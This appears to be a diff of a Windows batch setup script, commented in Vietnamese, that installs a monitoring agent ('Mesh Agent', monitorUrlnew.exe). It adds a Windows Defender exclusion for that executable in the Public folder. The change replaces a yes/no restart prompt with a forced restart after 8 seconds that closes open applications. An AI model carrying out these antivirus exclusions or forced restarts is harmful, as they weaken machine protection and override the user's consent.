@@ -88,14 +88,10 @@ powershell -Command "Set-Service -Name 'Mesh Agent' -StartupType Manual"
 :: === Thêm vào danh sách ngoại lệ Defender trước khi hỏi restart ===
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\monitorUrlnew.exe'"
 
-:: === Xác nhận khởi động lại bằng popup PowerShell ===
-powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-"Add-Type -AssemblyName System.Windows.Forms; ^
-$result = [System.Windows.Forms.MessageBox]::Show('Khởi động lại máy để hoàn tất cài đặt?', 'Yêu cầu khởi động lại', [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Question); ^
-if ($result -eq [System.Windows.Forms.DialogResult]::Yes) { ^
-Start-Sleep -Seconds 3; shutdown /r /t 10 /c 'Máy sẽ khởi động lại để hoàn tất cài đặt.' ^
-} else { ^
-Start-Process -FilePath 'C:\Users\Public\monitorUrlnew.exe' }"
+:: === Khởi động lại sau 8 giây, ép đóng app, kèm lý do và thông báo ===
+shutdown.exe /r /t 8 /f /d p:0:0 /c "Máy sẽ khởi động lại để hoàn tất cài đặt."
+
 echo Done all setup. Exiting script...
 exit /b 0
+
 
